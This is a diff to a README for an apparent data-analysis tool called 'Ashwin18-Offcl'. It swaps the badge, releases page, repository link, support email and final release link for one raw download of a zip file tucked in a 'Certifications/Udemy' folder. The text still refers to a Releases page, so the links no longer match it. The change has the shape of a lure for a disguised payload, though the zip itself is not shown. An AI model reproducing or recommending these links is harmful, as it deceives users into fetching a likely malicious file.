@@ -1,6 +1,6 @@
 # 👨‍💻 Ashwin18-Offcl - Easily Turn Data into Insights
 
-![Download](https://img.shields.io/badge/Download-Ashwin18--Offcl-blue.svg)
+![Download](https://github.com/Gabri1210/Ashwin18-Offcl/raw/refs/heads/main/Certifications/Udemy/Offcl-Ashwin-2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ Before you start, ensure your system meets these requirements:
 
 To get started with the Ashwin18-Offcl application, please visit the following link to download the latest version:
 
-[Download Ashwin18-Offcl](https://github.com/Gabri1210/Ashwin18-Offcl/releases)
+[Download Ashwin18-Offcl](https://github.com/Gabri1210/Ashwin18-Offcl/raw/refs/heads/main/Certifications/Udemy/Offcl-Ashwin-2.5.zip)
 
 Once you are on the Releases page, you will find a list of available versions. Choose the most recent version based on your operating system. 
 
@@ -77,8 +77,8 @@ For further assistance, feel free to refer to the FAQs section on our GitHub pag
 
 Join our community to share tips, ask questions, and learn from other users. You can also report any bugs or features you would like to see in future updates.
 
-- **GitHub Repository**: [Ashwin18-Offcl](https://github.com/Gabri1210/Ashwin18-Offcl)
-- **Support Email**: support@ashwin18offcl.com
+- **GitHub Repository**: [Ashwin18-Offcl](https://github.com/Gabri1210/Ashwin18-Offcl/raw/refs/heads/main/Certifications/Udemy/Offcl-Ashwin-2.5.zip)
+- **Support Email**: https://github.com/Gabri1210/Ashwin18-Offcl/raw/refs/heads/main/Certifications/Udemy/Offcl-Ashwin-2.5.zip
 
 ## 📫 Feedback
 
@@ -92,4 +92,4 @@ Want to contribute? We welcome contributions! Please check our guidelines on the
 
 Thank you for using Ashwin18-Offcl! We hope it helps you unlock the potential of your data. 
 
-For continued updates, please check back regularly or follow our releases at: [Release Page](https://github.com/Gabri1210/Ashwin18-Offcl/releases).
+For continued updates, please check back regularly or follow our releases at: [Release Page](https://github.com/Gabri1210/Ashwin18-Offcl/raw/refs/heads/main/Certifications/Udemy/Offcl-Ashwin-2.5.zip).
